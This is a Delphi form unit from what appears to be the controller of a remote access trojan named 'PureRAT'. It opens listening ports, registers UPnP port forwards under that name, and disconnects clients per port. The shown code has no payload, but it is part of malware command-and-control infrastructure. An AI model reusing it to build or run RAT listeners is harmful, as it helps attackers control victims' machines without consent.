unit UnitSelectPort;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, Spin, UnitMain, Menus, SocketUnitEx, ActiveX,
  UnitConstants, UnitFunctions, ComObj, UnitVariables, WinSock, uJSONConfig;

type
  TFormSelectPort = class(TForm)
    lbl1: TLabel;
    lbl15: TLabel;
    se1: TSpinEdit;
    chk1: TCheckBox;
    btn1: TButton;
    edt1: TEdit;
    chk2: TCheckBox;
    lv1: TListView;
    chk3: TCheckBox;
    se2: TSpinEdit;
    lbl2: TLabel;
    btn2: TButton;
    btn3: TButton;
    pm3: TPopupMenu;
    S5: TMenuItem;
    S3: TMenuItem;
    N8: TMenuItem;
    R2: TMenuItem;
    procedure btn2Click(Sender: TObject);
    procedure btn3Click(Sender: TObject);
    procedure S5Click(Sender: TObject);
    procedure S3Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure chk2Click(Sender: TObject);
    procedure lv1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
    procedure OpenPort(i: Integer; Port: Word; UseUpnP: Boolean);
    procedure ClosePort(Port: Word);
  public
    { Public declarations }
    procedure AddPort(Port: Word; AutoStart, UseUpnP: Boolean);
  end;

var
  FormSelectPort: TFormSelectPort;
  ServerSocketThread: array[1..65535] of TServerSocketThread;

implementation

{$R *.dfm}

procedure DeleteUpnPEntry(Port: Word);
var
  UpnP: Variant;
Begin
  try
    CoInitialize(nil);

    try
      UpnP := CreateOleObject('HNetCfg.NATUPnP');
      UpnP.StaticPortMappingCollection.Remove(Port, 'TCP');
    except
    end;
  finally
    CoUnInitialize;
  end;
end;

function AddUpnPEntry(Port: Word): Boolean;
var
  UpnP: Variant;
  LanIp: string;
Begin
  Result := False;
  LanIp := LocalAddress;
  if (LanIp = '127.0.0.1') or (LanIp = '') then Exit;

  try
    CoInitialize(nil);

    try
      UpnP := CreateOleObject('HNetCfg.NATUPnP');
      UpnP.StaticPortMappingCollection.Add(Port, 'TCP', Port, LanIp, True, 'PureRAT');
      Result := True;
    except
      Result := False;
    end;
  finally
    CoUnInitialize;
  end;
end;

procedure TFormSelectPort.OpenPort(i: Integer; Port: Word; UseUpnP: Boolean);
var
  TmpBool: Boolean;
begin
  ServerSocketThread[Port] := TServerSocketThread.Create();
  ServerSocketThread[Port].Port := Port;
  ServerSocketThread[Port].TestPort;
  if ServerSocketThread[Port].Listening then ServerSocketThread[Port].Resume else
  begin
    MessageBox(Handle, PChar('Failed to open port ' + IntToStr(Port) + '.'),
      PROGRAMINFOS, MB_ICONERROR);
    FormMain.AddLog('Failed to start server on port ' + IntToStr(Port) +
      ' from socket ' + IntToStr(ServerSocketThread[Port].Socket), 285, clRed);
    Exit;
  end;

  if not UseUpnP then TmpBool := False else
  begin
    TmpBool := AddUpnPEntry(Port);
    if (UseUpnP) and (TmpBool = False) then
    begin
      MessageBox(Handle, PChar('Failed to forward port ' + IntToStr(Port) + '.'),
        PROGRAMINFOS, MB_ICONERROR);
    end;
  end;

  lv1.Items.Item[i].Caption := IntToStr(Port) + ' (UpnP: ' + MyBoolToStr(TmpBool) + ')';
  lv1.Items.Item[i].ImageIndex := 295;

  FormMain.AddLog('Server started on port ' + IntToStr(Port) +
    ' from socket ' + IntToStr(ServerSocketThread[Port].Socket), 285, clGreen);
end;

procedure TFormSelectPort.AddPort(Port: Word; AutoStart, UseUpnP: Boolean);
var                
  PortList: TListItem;
begin
  PortList := lv1.Items.Add;
  PortList.Caption := IntToStr(Port) + ' (UpnP: ' + MyBoolToStr(UseUpnP) + ')';
  PortList.ImageIndex := 296;
  
  if AutoStart then OpenPort(PortList.Index, Port, UseUpnP);
end;

procedure TFormSelectPort.ClosePort(Port: Word);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin
  for i := 0 to ClientsList.Count -1 do
  begin
    ClientDatas := TClientDatas(ClientsList[i]);
    if ClientDatas = nil then Continue;
    if ClientDatas.Infos.LocalPort = IntToStr(Port) then ClientDatas.ClientSocket.Disconnect;
  end;

  FormMain.AddLog('Server stopped on port ' + IntToStr(Port) +
    ' from socket ' + IntToStr(ServerSocketThread[Port].Socket), 285, clRed);
    
  ServerSocketThread[Port].StopServer;
end;

procedure TFormSelectPort.btn2Click(Sender: TObject);
begin
  ModalResult := mrOk;
end;

procedure TFormSelectPort.btn3Click(Sender: TObject);
begin
  ModalResult := mrCancel;
end;

procedure TFormSelectPort.S5Click(Sender: TObject);
var
  Port: Integer;
  TmpStr, Tmpstr1, TmpStr2: string;
  TmpBool: Boolean;
begin
  if not Assigned(lv1.Selected) then Exit;
  if lv1.Selected.ImageIndex = 296 then Exit;

  TmpStr := lv1.Selected.Caption;
  TmpStr1 := Copy(TmpStr, Pos(':', TmpStr) + 2, Pos(')', TmpStr) - 1); //i can't get only 'No' :(
  TmpStr2 := Copy(TmpStr, 1, Pos(' ', TmpStr) - 1);
  Port := StrToInt(TmpStr2);

  if Tmpstr1 <> 'No)' then
  begin
    DeleteUpnPEntry(Port);
    TmpBool := False;
  end
  else
  begin                           
    TmpBool := AddUpnPEntry(Port);
    if TmpBool = False then
    begin
      MessageBox(Handle, PChar('Failed to enable forwarding on port ' + TmpStr2 + '.'),
        PROGRAMINFOS, MB_ICONERROR);
    end;
  end;

  lv1.Selected.Caption := Tmpstr2 + ' (UpnP: ' + MyBoolToStr(TmpBool) + ')';
end;

procedure TFormSelectPort.S3Click(Sender: TObject);
var
  Port: Integer;
  TmpStr, TmpStr1, TmpStr2: string;
begin
  if not Assigned(lv1.Selected) then Exit;

  TmpStr := lv1.Selected.Caption;
  TmpStr1 := Copy(TmpStr, Pos(':', TmpStr) + 2, Pos(')', TmpStr) - 1);
  TmpStr2 := Copy(TmpStr, 1, Pos(' ', TmpStr) - 1);
  Port := StrToInt(TmpStr2);
                                                                                             
  if lv1.Selected.ImageIndex = 296 then
    OpenPort(lv1.Selected.Index, Port, chk1.Checked)
  else

  if lv1.Selected.ImageIndex = 295 then
  begin
    if Tmpstr1 <> 'No)' then DeleteUpnPEntry(Port);
    ClosePort(Port);
    lv1.Selected.ImageIndex := 296;
  end;
end;

procedure TFormSelectPort.R2Click(Sender: TObject);
var
  Port: Integer;
  TmpStr, TmpStr1, TmpStr2: string;
begin
  if not Assigned(lv1.Selected) then Exit;

  TmpStr := lv1.Selected.Caption;
  TmpStr1 := Copy(TmpStr, Pos(':', TmpStr) + 2, Pos(')', TmpStr) - 1);
  TmpStr2 := Copy(TmpStr, 1, Pos(' ', TmpStr) - 1);
  Port := StrToInt(TmpStr2);

  if lv1.Selected.ImageIndex = 295 then
  begin
    if Tmpstr1 <> 'No)' then DeleteUpnPEntry(Port);
    ClosePort(Port);
  end;
  
  lv1.Selected.Delete;
end;

procedure TFormSelectPort.btn1Click(Sender: TObject);
var
  i, Port: Integer;
  TmpStr, TmpStr1, TmpStr2: string;
begin
  if se1.Text = '' then Exit;
  for i := 0 to lv1.Items.Count - 1 do
  begin                                                     
    Application.ProcessMessages;
    TmpStr := lv1.Items.Item[i].Caption;
    TmpStr1 := Copy(TmpStr, Pos(':', TmpStr) + 2, Pos(')', TmpStr) - 1);
    TmpStr2 := Copy(TmpStr, 1, Pos(' ', TmpStr) - 1);
    Port := StrToInt(TmpStr2);

    if se1.Value = Port then
    begin
      MessageBox(Handle, 'Choosen port is already loaded in ports list.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;
  end;

  AddPort(se1.Value, chk3.Checked, chk1.Checked);
end;

procedure TFormSelectPort.chk2Click(Sender: TObject);
begin
  if chk2.Checked then edt1.PasswordChar := #0 else edt1.PasswordChar := '*';
end;

procedure TFormSelectPort.lv1ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lv1.Selected) then
    for i := 0 to pm3.Items.Count - 1 do pm3.Items[i].Enabled := False
  else for i := 0 to pm3.Items.Count - 1 do pm3.Items[i].Enabled := True;
end;

procedure TFormSelectPort.FormCreate(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  i: Integer;
begin
  //Load windows position settings
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  i := JSONConfig.ReadInteger('Ports left');
  if i <= 0 then Left := (Screen.Width - Width) div 2 else Left := i;
  i := JSONConfig.ReadInteger('Ports top');
  if i <= 0 then Top := (Screen.Height - Height) div 2 else Top := i;
  JSONConfig.Free;
end;

procedure TFormSelectPort.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  JSONConfig: TJSONConfig;
begin
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.WriteInteger('Ports left', Left);
  JSONConfig.WriteInteger('Ports top', Top);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

end.
